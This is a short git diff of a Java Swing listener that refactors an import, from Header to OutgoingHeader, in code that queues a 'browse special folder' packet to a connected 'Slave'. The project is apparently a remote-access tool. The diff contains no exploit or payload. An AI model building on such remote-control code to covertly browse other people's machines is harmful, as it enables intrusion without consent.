@@ -6,8 +6,8 @@ import java.awt.event.ActionListener;
 import javax.swing.JMenuItem;
 
 import com.redpois0n.Slave;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
 
 public class DirListener implements ActionListener {
 
@@ -19,7 +19,7 @@ public class DirListener implements ActionListener {
 
 	public void actionPerformed(ActionEvent arg0) {
 		JMenuItem item = (JMenuItem) arg0.getSource();
-		sl.addToSendQueue(new PacketBuilder(Header.BROWSE_SPECIAL, item.getText().toUpperCase()));
+		sl.addToSendQueue(new PacketBuilder(OutgoingHeader.BROWSE_SPECIAL, item.getText().toUpperCase()));
 	}
 
 }
